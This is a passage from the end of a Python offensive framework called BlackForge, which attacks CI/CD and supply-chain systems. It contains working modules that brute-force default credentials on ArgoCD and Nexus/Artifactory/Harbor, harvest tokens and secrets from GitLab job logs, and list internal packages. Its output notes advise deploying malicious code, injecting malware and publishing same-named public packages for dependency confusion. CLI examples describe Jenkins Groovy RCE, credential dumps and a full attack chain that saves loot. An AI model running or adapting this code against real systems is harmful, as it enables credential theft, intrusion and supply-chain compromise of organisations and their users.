            resp = _req(ctx, "GET", f"{base}/api/v4/projects/{pid}/jobs?per_page=5",
                        headers=hdrs)
            if not resp or not resp.ok:
                continue
            jobs = resp.json() if isinstance(resp.json(), list) else []
            for job in jobs[:3]:
                log_resp = _req(ctx, "GET",
                                f"{base}/api/v4/projects/{pid}/jobs/{job['id']}/trace",
                                headers=hdrs)
                if log_resp and log_resp.ok:
                    log_text = log_resp.text[:10000]
                    for s in _scan_secrets(log_text):
                        log_findings.append({
                            "project": project["name"], "job": job["id"], **s})
                        _log(f"[GitLab] Secret in job log: {project['name']}#{job['id']}: {s['type']}", "CRIT")
                        ctx.credentials.append(Credential(
                            s["type"], {"value": s["value"]},
                            f"gitlab:job_log:{project['name']}#{job['id']}"))
        return [AttackResult("gitlab", "log_scan", "SUCCESS" if log_findings else "INFO",
                             severity="CRITICAL" if log_findings else "INFO",
                             data={"findings": log_findings},
                             notes=f"{len(log_findings)} secrets found in pipeline logs")]


# ── Module 4: ArgoCD ─────────────────────────────────────────────────────────

class ArgoCDModule:
    """ArgoCD: default credentials, API enumeration, application takeover."""

    def run(self, ctx: EngagementContext, url: str,
            username: str = "", password: str = "") -> List[AttackResult]:
        if not REQUESTS:
            return [AttackResult("argocd", "setup", "FAILED", notes="pip install requests")]
        results = []
        base = url.rstrip("/")
        ctx.loot.setdefault("argocd", {})
        results.extend(self._check_access(ctx, base))
        results.extend(self._bruteforce_creds(ctx, base, username, password))
        return results

    def _check_access(self, ctx: EngagementContext, base: str) -> List[AttackResult]:
        resp = _req(ctx, "GET", f"{base}/api/v1/version")
        if resp and resp.ok:
            data = resp.json()
            _log(f"[ArgoCD] Version: {data.get('Version', '?')}", "INFO")
            ctx.loot["argocd"]["version"] = data
            return [AttackResult("argocd", "discovery", "SUCCESS", target=base,
                                 data=data,
                                 notes=f"ArgoCD {data.get('Version','?')} at {base}")]
        return [AttackResult("argocd", "discovery", "FAILED", target=base,
                             notes="ArgoCD API not found")]

    def _bruteforce_creds(self, ctx: EngagementContext, base: str,
                           username: str, password: str) -> List[AttackResult]:
        creds_to_try = [(username, password)] if username and password else ARGOCD_DEFAULT_CREDS
        for user, passwd in creds_to_try:
            resp = _req(ctx, "POST", f"{base}/api/v1/session",
                        json={"username": user, "password": passwd})
            if resp and resp.ok:
                data = resp.json()
                token = data.get("token", "")
                if token:
                    _log(f"[ArgoCD] Login SUCCESS: {user}:{passwd}", "CRIT")
                    ctx.credentials.append(Credential(
                        "argocd_token", {"token": token, "user": user, "pass": passwd},
                        f"argocd:{base}",
                        f"ArgoCD auth token via {user}:{passwd}",
                    ))
                    # Enumerate with token
                    hdrs = {"Authorization": f"Bearer {token}"}
                    for path_name, path in ARGOCD_PATHS.items():
                        r = _req(ctx, "GET", f"{base}{path}", headers=hdrs)
                        if r and r.ok:
                            ctx.loot["argocd"][path_name] = r.json()
                    # Get list of managed apps and clusters
                    apps = ctx.loot["argocd"].get("apps", {}).get("items", [])
                    clusters = ctx.loot["argocd"].get("clusters", {}).get("items", [])
                    repos = ctx.loot["argocd"].get("repos", {}).get("items", [])
                    _log(f"[ArgoCD] Apps: {len(apps)} | Clusters: {len(clusters)} | Repos: {len(repos)}", "CRIT")
                    return [AttackResult("argocd", "auth_success", "SUCCESS", target=base,
                                         severity="CRITICAL",
                                         data={"user": user, "apps": len(apps),
                                               "clusters": len(clusters), "repos": len(repos)},
                                         notes=f"ArgoCD admin access as '{user}'. "
                                               f"{len(apps)} apps, {len(clusters)} clusters, {len(repos)} repos. "
                                               f"Can modify app sync targets → deploy malicious code.")]
        return [AttackResult("argocd", "auth_fail", "FAILED", target=base,
                             notes=f"Tried {len(creds_to_try)} credential pairs — all failed")]


# ── Module 5: Artifact Repository ────────────────────────────────────────────

class ArtifactModule:
    """Nexus/Artifactory/Harbor: credential harvest, anonymous access, dependency confusion."""

    def run(self, ctx: EngagementContext, url: str,
            username: str = "", password: str = "") -> List[AttackResult]:
        if not REQUESTS:
            return [AttackResult("artifact", "setup", "FAILED", notes="pip install requests")]
        results = []
        base = url.rstrip("/")
        ctx.loot.setdefault("artifact", {})

        # Detect artifact type
        platform = self._detect_platform(ctx, base)
        _log(f"[Artifact] Detected platform: {platform} at {base}", "INFO")
        ctx.loot["artifact"]["platform"] = platform

        results.extend(self._check_anonymous_access(ctx, base, platform))
        results.extend(self._brute_default_creds(ctx, base, platform, username, password))
        results.extend(self._check_dependency_confusion(ctx, base, platform))
        return results

    def _detect_platform(self, ctx: EngagementContext, base: str) -> str:
        for platform, paths in ARTIFACT_PATHS.items():
            resp = _req(ctx, "GET", f"{base}{paths[0]}")
            if resp and resp.status_code in (200, 401, 403):
                return platform
        return "unknown"

    def _check_anonymous_access(self, ctx: EngagementContext,
                                  base: str, platform: str) -> List[AttackResult]:
        anon_findings = []
        if platform == "nexus":
            resp = _req(ctx, "GET", f"{base}/service/rest/v1/repositories")
            if resp and resp.ok:
                repos = resp.json() if isinstance(resp.json(), list) else []
                _log(f"[Artifact/Nexus] Anonymous access! {len(repos)} repos", "CRIT")
                anon_findings.append({"type": "nexus_repos", "count": len(repos)})
                ctx.loot["artifact"]["repos"] = repos
        elif platform == "artifactory":
            resp = _req(ctx, "GET", f"{base}/api/repositories")
            if resp and resp.ok:
                repos = resp.json() if isinstance(resp.json(), list) else []
                _log(f"[Artifact/Artifactory] Anonymous access! {len(repos)} repos", "CRIT")
                anon_findings.append({"type": "artifactory_repos", "count": len(repos)})
        elif platform == "harbor":
            resp = _req(ctx, "GET", f"{base}/api/v2.0/projects")
            if resp and resp.ok:
                projects = resp.json() if isinstance(resp.json(), list) else []
                _log(f"[Artifact/Harbor] Anonymous access! {len(projects)} projects", "CRIT")
                anon_findings.append({"type": "harbor_projects", "count": len(projects)})

        if anon_findings:
            return [AttackResult("artifact", "anon_access", "SUCCESS", target=base,
                                 severity="HIGH", data=anon_findings,
                                 notes=f"{platform} allows anonymous read. "
                                       f"Download artifacts, enumerate packages, supply chain risk.")]
        return []

    def _brute_default_creds(self, ctx: EngagementContext, base: str,
                               platform: str, username: str,
                               password: str) -> List[AttackResult]:
        creds = [(username, password)] if username and password else ARTIFACT_DEFAULT_CREDS
        auth_path = {
            "nexus": "/service/rest/v1/repositories",
            "artifactory": "/api/system/info",
            "harbor": "/api/v2.0/systeminfo",
        }.get(platform, "/")

        for user, passwd in creds:
            resp = _req(ctx, "GET", f"{base}{auth_path}", auth=(user, passwd))
            if resp and resp.ok:
                _log(f"[Artifact/{platform}] Default creds: {user}:{passwd}", "CRIT")
                ctx.credentials.append(Credential(
                    f"{platform}_credential",
                    {"username": user, "password": passwd},
                    f"artifact:{platform}:{base}",
                    f"Default credentials for {platform}",
                ))
                return [AttackResult("artifact", "default_creds", "SUCCESS", target=base,
                                     severity="CRITICAL",
                                     data={"platform": platform, "user": user, "pass": passwd},
                                     notes=f"{platform} admin access via {user}:{passwd}. "
                                           f"Can publish packages, manipulate artifacts, inject malware.")]
        return [AttackResult("artifact", "default_creds", "FAILED", target=base,
                             notes=f"No default credentials worked for {platform}")]

    def _check_dependency_confusion(self, ctx: EngagementContext,
                                     base: str, platform: str) -> List[AttackResult]:
        """Check if internal packages could be confused with public packages."""
        internal_packages = []
        if platform == "nexus":
            resp = _req(ctx, "GET", f"{base}/service/rest/v1/assets?repository=npm-internal&limit=20")
            if resp and resp.ok:
                data = resp.json()
                for item in data.get("items", [])[:10]:
                    name = item.get("name", "")
                    internal_packages.append(name)
        elif platform == "artifactory":
            resp = _req(ctx, "GET", f"{base}/api/search/artifact?name=*&repos=npm-local&limit=10",
                        auth=None)
            if resp and resp.ok:
                results_data = resp.json().get("results", [])
                for r in results_data[:10]:
                    internal_packages.append(r.get("name", ""))

        if internal_packages:
            ctx.loot["artifact"]["internal_packages"] = internal_packages
            return [AttackResult("artifact", "dep_confusion", "SUCCESS", target=base,
                                 severity="HIGH",
                                 data={"packages": internal_packages},
                                 notes=f"Internal packages found: {internal_packages[:5]}. "
                                       f"Publish same-named packages to public npm/PyPI with higher versions "
                                       f"to trigger dependency confusion attacks in CI pipelines.")]
        return [AttackResult("artifact", "dep_confusion", "PARTIAL",
                             notes="Could not enumerate internal packages. Try with credentials.")]


# ── Output & CLI ──────────────────────────────────────────────────────────────

def print_banner() -> None:
    if PYFIGLET:
        import pyfiglet as pf
        print(f"\033[35m{pf.figlet_format('BlackForge', font='slant')}\033[0m")
    else:
        print(f"\033[35m\n  {TOOL_NAME} v{VERSION}\n\033[0m")
    print(f"\033[36m  Author: {AUTHOR}  |  CI/CD & Supply Chain Attack Framework\033[0m\n")

def print_legal(yes: bool) -> bool:
    print(f"\033[33m{LEGAL_WARNING}\033[0m")
    if yes:
        return True
    try:
        ans = input("  Type 'yes' to confirm written authorization: ").strip().lower()
        return ans == "yes"
    except (KeyboardInterrupt, EOFError):
        return False

def dump_results(ctx: EngagementContext, output: Optional[str]) -> None:
    success = sum(1 for r in ctx.results if r.status == "SUCCESS")
    crits   = sum(1 for r in ctx.results if r.severity == "CRITICAL")
    print(f"\n\033[35m{'═'*60}\n  CI/CD ENGAGEMENT RESULTS\n{'═'*60}\033[0m")
    print(f"  Total: {len(ctx.results)} | Success: \033[32m{success}\033[0m | Critical: \033[35m{crits}\033[0m\n")
    for r in ctx.results:
        icons = {"SUCCESS":"\033[32m[+]","FAILED":"\033[31m[x]","PARTIAL":"\033[33m[~]","INFO":"\033[36m[*]"}
        c = icons.get(r.status,"   "); reset = "\033[0m"
        tgt = f" → {r.target}" if r.target else ""
        print(f"  {c}{reset} [{r.module}] {r.action}{tgt}")
        if r.notes: print(f"        {r.notes}")
    if ctx.credentials:
        print(f"\n\033[32m[+] CREDENTIALS ({len(ctx.credentials)})\033[0m")
        for c in ctx.credentials:
            v = str(list(c.value.values())[0] if c.value else "")
            print(f"  [{c.type}] {c.source}: {v[:60]}")
    if output:
        payload = {
            "tool": TOOL_NAME, "version": VERSION,
            "results": [{"module":r.module,"action":r.action,"status":r.status,
                         "target":r.target,"severity":r.severity,"notes":r.notes}
                        for r in ctx.results],
            "credentials": [{"type":c.type,"value":c.value,"source":c.source} for c in ctx.credentials],
            "loot": ctx.loot,
        }
        Path(output).write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
        print(f"\n\033[32m[+] Results saved → {output}\033[0m")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog=COMMAND, description=f"{TOOL_NAME} v{VERSION}",
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=textwrap.dedent(f"""
        Examples:
          # GitHub: enumerate org + scan workflow files for injection
          python {COMMAND}.py --modules github --github-token ghp_xxx --github-org myorg --github-repo myorg/repo

          # Jenkins: full attack (anon access check + Groovy RCE + cred dump)
          python {COMMAND}.py --modules jenkins --jenkins-url http://jenkins.corp.com:8080

          # Jenkins with credentials:
          python {COMMAND}.py --modules jenkins --jenkins-url http://jenkins:8080 -u admin -p admin

          # GitLab: CI variable dump + runner token theft
          python {COMMAND}.py --modules gitlab --gitlab-url https://gitlab.corp.com --gitlab-token glpat-xxx

          # ArgoCD: default credential attack
          python {COMMAND}.py --modules argocd --argocd-url https://argocd.corp.com

          # Artifact registry: anonymous access + dependency confusion
          python {COMMAND}.py --modules artifact --artifact-url http://nexus.corp.com:8081

          # Full chain on all platforms
          python {COMMAND}.py --modules all \\
            --github-token TOKEN --github-org ORG \\
            --jenkins-url http://jenkins:8080 \\
            --gitlab-url https://gitlab.corp.com --gitlab-token TOKEN \\
            --argocd-url https://argocd.corp.com \\
            --output loot.json
        """))
    p.add_argument("--modules",  nargs="+",
                   choices=["github","jenkins","gitlab","argocd","artifact","all"],
                   default=["github"])
    # GitHub
    p.add_argument("--github-token",  default="", help="GitHub personal access token")
    p.add_argument("--github-org",    default="", help="GitHub organization name")
    p.add_argument("--github-repo",   default="", help="GitHub repo (owner/repo)")
    # Jenkins
    p.add_argument("--jenkins-url",   default="")
    p.add_argument("--jenkins-cmd",   default="id", help="Custom Groovy command")
    # GitLab
    p.add_argument("--gitlab-url",    default="")
    p.add_argument("--gitlab-token",  default="")
    # ArgoCD
    p.add_argument("--argocd-url",    default="")
    # Artifact
    p.add_argument("--artifact-url",  default="")
    # Generic auth
    p.add_argument("-u","--username", default="")
    p.add_argument("-p","--password", default="")
    p.add_argument("--delay",    type=float, default=DEFAULT_DELAY)
    p.add_argument("--output","-o", help="Save results to JSON file")
    p.add_argument("--yes","-y", action="store_true")
    p.add_argument("--version",  action="version", version=f"{TOOL_NAME} v{VERSION}")
    return p


def main() -> int:
    parser = build_parser()
    args   = parser.parse_args()
    print_banner()
    if not print_legal(args.yes): return 1
    if not REQUESTS:
        print("ERROR: pip install requests")
        return 2

    ctx = EngagementContext(delay=args.delay)
    run_all = "all" in args.modules
    modules_to_run = ["github","jenkins","gitlab","argocd","artifact"] if run_all else args.modules

    for mod_name in modules_to_run:
        _log(f"Running module: {mod_name.upper()}", "INFO")
        try:
            if mod_name == "github":
                mod = GitHubModule()
                results = mod.run(ctx, token=args.github_token,
                                  org=args.github_org, repo=args.github_repo)
            elif mod_name == "jenkins":
                if not args.jenkins_url:
                    _log("--jenkins-url required", "WARN"); continue
                mod = JenkinsModule()
                results = mod.run(ctx, url=args.jenkins_url,
                                  username=args.username, password=args.password)
            elif mod_name == "gitlab":
                if not args.gitlab_url:
                    _log("--gitlab-url required", "WARN"); continue
                mod = GitLabModule()
                results = mod.run(ctx, url=args.gitlab_url, token=args.gitlab_token,
                                  username=args.username, password=args.password)
            elif mod_name == "argocd":
                if not args.argocd_url:
                    _log("--argocd-url required", "WARN"); continue
                mod = ArgoCDModule()
                results = mod.run(ctx, url=args.argocd_url,
                                  username=args.username, password=args.password)
            elif mod_name == "artifact":
                if not args.artifact_url:
                    _log("--artifact-url required", "WARN"); continue
                mod = ArtifactModule()
                results = mod.run(ctx, url=args.artifact_url,
                                  username=args.username, password=args.password)
            else:
                continue
            ctx.results.extend(results)
        except Exception as exc:
            _log(f"Module {mod_name} error: {exc}", "ERR")

    dump_results(ctx, args.output)
    return 0


if __name__ == "__main__":
    sys.exit(main())
